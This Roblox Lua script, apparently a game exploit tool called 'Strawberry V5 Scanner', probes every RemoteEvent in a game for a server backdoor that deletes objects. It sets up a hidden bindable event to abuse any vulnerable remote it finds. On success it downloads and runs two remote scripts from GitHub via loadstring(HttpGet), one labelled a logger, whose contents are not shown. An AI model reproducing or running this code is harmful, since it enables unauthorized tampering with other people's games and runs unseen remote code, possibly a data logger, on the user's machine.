--[[
⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢀⠀⠀
⠀⠀⠀⠀⠀⠀⣏⠓⠒⠤⣰⠋⠹⡄⠀⣠⠞⣿⠀⠀
⠀⠀⠀⢀⠄⠂⠙⢦⡀⠐⠨⣆⠁⣷⣮⠖⠋⠉⠁⠀
⠀⠀⡰⠁⠀⠮⠇⠀⣩⠶⠒⠾⣿⡯⡋⠩⡓⢦⣀⡀
⠀⡰⢰⡹⠀⠀⠲⣾⣁⣀⣤⠞⢧⡈⢊⢲⠶⠶⠛⠁
⢀⠃⠀⠀⠀⣌⡅⠀⢀⡀⠀⠀⣈⠻⠦⣤⣿⡀⠀⠀
⠸⣎⠇⠀⠀⡠⡄⠀⠷⠎⠀⠐⡶⠁⠀⠀⣟⡇⠀⠀
⡇⠀⡠⣄⠀⠷⠃⠀⠀⡤⠄⠀⠀⣔⡰⠀⢩⠇⠀⠀
⡇⠀⠻⠋⠀⢀⠤⠀⠈⠛⠁⠀⢀⠉⠁⣠⠏⠀⠀⠀
⣷⢰⢢⠀⠀⠘⠚⠀⢰⣂⠆⠰⢥⡡⠞⠁⠀⠀⠀⠀
⠸⣎⠋⢠⢢⠀⢠⢀⠀⠀⣠⠴⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠷⣬⣅⣀⣬⡷⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠁⠀

made by C:\Drive and Saji⠀⠀⠀

C:\Drive - Gui, Commands
Saji - Scanner
Abuses Delete Remotes
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
]]--

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local localplayer = Players.LocalPlayer
local playergui = localplayer:WaitForChild("PlayerGui")

local timer = 0 -- lil stopwatch fr
local backdoorfound = false -- did we catch the sus remote yet??
local vulnremote = nil -- the goofy remote that gets caught lacking
local totalremotes = 0 -- how many remotes in this wild game
local scannedremotes = 0 -- how many we actually peeped so far
local safetime = 0.25 -- chill delay so we don't break stuff lol

local screengui = Instance.new("ScreenGui")
screengui.Name = "StrawberryScanner"
screengui.ResetOnSpawn = false
screengui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screengui.Parent = playergui

local mainframe = Instance.new("Frame")
mainframe.Name = "MainFrame"
mainframe.Size = UDim2.new(0, 450, 0, 280)
mainframe.Position = UDim2.new(0.5, -225, 0.5, -140)
mainframe.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
mainframe.BackgroundTransparency = 0.15
mainframe.BorderSizePixel = 0
mainframe.Parent = screengui

local dragging
local dragStart
local startPos

local function updateInput(input)
    local delta = input.Position - dragStart
    local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    mainframe.Position = position
end

mainframe.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainframe.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

mainframe.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        if dragging then
            updateInput(input)
        end
    end
end)

local blurframe = Instance.new("Frame")
blurframe.Name = "BlurFrame"
blurframe.Size = UDim2.new(1, 0, 1, 0)
blurframe.Position = UDim2.new(0, 0, 0, 0)
blurframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
blurframe.BackgroundTransparency = 0.95
blurframe.BorderSizePixel = 0
blurframe.Parent = mainframe

local maincorner = Instance.new("UICorner")
maincorner.CornerRadius = UDim.new(0, 12)
maincorner.Parent = mainframe

local blurcorner = Instance.new("UICorner")
blurcorner.CornerRadius = UDim.new(0, 12)
blurcorner.Parent = blurframe

local borderframe = Instance.new("Frame")
borderframe.Name = "BorderFrame"
borderframe.Size = UDim2.new(1, 4, 1, 4)
borderframe.Position = UDim2.new(0, -2, 0, -2)
borderframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
borderframe.BackgroundTransparency = 0.8
borderframe.BorderSizePixel = 0
borderframe.ZIndex = mainframe.ZIndex - 1
borderframe.Parent = mainframe

local bordercorner = Instance.new("UICorner")
bordercorner.CornerRadius = UDim.new(0, 14)
bordercorner.Parent = borderframe

local bordergradient = Instance.new("UIGradient")
bordergradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 100, 150)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 150, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 255, 100))
}
bordergradient.Parent = borderframe

local titlelabel = Instance.new("TextLabel")
titlelabel.Name = "TitleLabel"
titlelabel.Size = UDim2.new(1, -40, 0, 40)
titlelabel.Position = UDim2.new(0, 20, 0, 15)
titlelabel.BackgroundTransparency = 1
titlelabel.Text = "🍓 STRAWBERRY V5 SCANNER"
titlelabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titlelabel.TextScaled = true
titlelabel.Font = Enum.Font.GothamBold
titlelabel.Parent = mainframe

local subtitlelabel = Instance.new("TextLabel")
subtitlelabel.Name = "SubtitleLabel"
subtitlelabel.Size = UDim2.new(1, -40, 0, 25)
subtitlelabel.Position = UDim2.new(0, 20, 0, 50)
subtitlelabel.BackgroundTransparency = 1
subtitlelabel.Text = "Scanning for vulnerable remotes..."
subtitlelabel.TextColor3 = Color3.fromRGB(200, 200, 200)
subtitlelabel.TextScaled = true
subtitlelabel.Font = Enum.Font.Gotham
subtitlelabel.Parent = mainframe

local progresscontainer = Instance.new("Frame")
progresscontainer.Name = "ProgressContainer"
progresscontainer.Size = UDim2.new(1, -40, 0, 20)
progresscontainer.Position = UDim2.new(0, 20, 0, 90)
progresscontainer.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
progresscontainer.BackgroundTransparency = 0.3
progresscontainer.BorderSizePixel = 0
progresscontainer.Parent = mainframe

local progresscorner = Instance.new("UICorner")
progresscorner.CornerRadius = UDim.new(0, 10)
progresscorner.Parent = progresscontainer

local progressbar = Instance.new("Frame")
progressbar.Name = "ProgressBar"
progressbar.Size = UDim2.new(0, 0, 1, 0)
progressbar.Position = UDim2.new(0, 0, 0, 0)
progressbar.BackgroundColor3 = Color3.fromRGB(100, 255, 150)
progressbar.BorderSizePixel = 0
progressbar.Parent = progresscontainer

local progressbarcorner = Instance.new("UICorner")
progressbarcorner.CornerRadius = UDim.new(0, 10)
progressbarcorner.Parent = progressbar

local progressgradient = Instance.new("UIGradient")
progressgradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 100, 150)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 255, 150))
}
progressgradient.Parent = progressbar

local statuslabel = Instance.new("TextLabel")
statuslabel.Name = "StatusLabel"
statuslabel.Size = UDim2.new(1, -40, 0, 30)
statuslabel.Position = UDim2.new(0, 20, 0, 125)
statuslabel.BackgroundTransparency = 1
statuslabel.Text = "Initializing scanner..."
statuslabel.TextColor3 = Color3.fromRGB(255, 255, 255)
statuslabel.TextScaled = true
statuslabel.Font = Enum.Font.Gotham
statuslabel.Parent = mainframe

local detailslabel = Instance.new("TextLabel")
detailslabel.Name = "DetailsLabel"
detailslabel.Size = UDim2.new(1, -40, 0, 60)
detailslabel.Position = UDim2.new(0, 20, 0, 160)
detailslabel.BackgroundTransparency = 1
detailslabel.TextColor3 = Color3.fromRGB(180, 180, 180)
detailslabel.TextScaled = true
detailslabel.Font = Enum.Font.Gotham
detailslabel.Parent = mainframe

local loadingdots = Instance.new("TextLabel")
loadingdots.Name = "LoadingDots"
loadingdots.Size = UDim2.new(0, 30, 0, 30)
loadingdots.Position = UDim2.new(1, -50, 0, 125)
loadingdots.BackgroundTransparency = 1
loadingdots.Text = "●"
loadingdots.TextColor3 = Color3.fromRGB(100, 255, 150)
loadingdots.TextScaled = true
loadingdots.Font = Enum.Font.GothamBold
loadingdots.Parent = mainframe

coroutine.wrap(function()
    while mainframe.Parent do
        for i = 0, 360, 2 do
            if not mainframe.Parent then break end
            bordergradient.Rotation = i
            task.wait(0.02)
        end
    end
end)()

coroutine.wrap(function()
    local dots = {"●", "●●", "●●●", "●●", "●"}
    local index = 1
    while backdoorfound == false and mainframe.Parent do
        loadingdots.Text = dots[index]
        index = index % #dots + 1
        task.wait(0.3)
    end
end)()

mainframe.Size = UDim2.new(0, 0, 0, 0)
mainframe.BackgroundTransparency = 1

local entrancetween = TweenService:Create(mainframe, 
    TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
    {Size = UDim2.new(0, 450, 0, 280), BackgroundTransparency = 0.15}
)
entrancetween:Play()

coroutine.wrap(function()
    repeat
        timer += 0.01
        task.wait(0.01)
    until backdoorfound
end)()

local deletebind = Instance.new("BindableEvent", localplayer)
deletebind.Name = "deletebind"
deletebind.Event:Connect(function(item)
    if backdoorfound == true then
        vulnremote:FireServer(item)
    end
end)

local function remotebackdoored(remote)
    local function testfire(item)
        pcall(function()
            remote:FireServer(item)			
        end)
    end
    
    local function isdestroyed(obj)
        return obj == nil or obj.Parent == nil
    end
    
    local testpart = localplayer.StarterGear
    testfire(testpart)
    task.wait(safetime)
    
    print("STRAWBERRY V5: "..remote.Name.." /isbackdoored: "..tostring(isdestroyed(testpart)).." / "..remote:GetFullName())
    
    if isdestroyed(testpart) then
        vulnremote = remote
        return true
    end
    return false
end

local function scan()
    if backdoorfound then return end
    
    statuslabel.Text = "Counting remotes..."
    for i, v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            if v.Parent and v.Parent.Name ~= "RobloxReplicatedStorage" then
                totalremotes = totalremotes + 1
            end
        end
    end
    
    statuslabel.Text = "Found "..totalremotes.." remotes to scan"
    task.wait(1)
    
    for i, v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            if not v.Parent then continue end
            if v.Parent.Name == "RobloxReplicatedStorage" then continue end
            
            scannedremotes = scannedremotes + 1
            local progress = scannedremotes / totalremotes
            
            statuslabel.Text = "Scanning: "..v.Name.." ("..scannedremotes.."/"..totalremotes..")"
            
            local progresstween = TweenService:Create(progressbar,
                TweenInfo.new(0.3, Enum.EasingStyle.Quad),
                {Size = UDim2.new(progress, 0, 1, 0)}
            )
            progresstween:Play()
            
            if remotebackdoored(v) == true then
                backdoorfound = true
                print("found1!!?!?!")
                return
            end
        end
    end
end

local function showresult()
    loadingdots.Visible = false
    
    if backdoorfound then
        statuslabel.Text = "🎉 BACKDOOR FOUND!"
        statuslabel.TextColor3 = Color3.fromRGB(100, 255, 150)
        
        subtitlelabel.Text = "Backdoored Remote: "..vulnremote.Name
        
        loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/UI_Source/v.5.50.lua"))()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/Loggers/log_v5.50.lua"))()
        
    else
        statuslabel.Text = "❌ No backdoor found"
        statuslabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        subtitlelabel.Text = "This game appears to be secure"
        
        mainframe.BackgroundColor3 = Color3.fromRGB(50, 15, 15)
    end
    
    local exittween = TweenService:Create(mainframe,
        TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In),
        {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1}
    )
    exittween:Play()
    exittween.Completed:Wait()
    
    screengui:Destroy()
end

task.wait(2)
scan()
task.wait()
showresult()
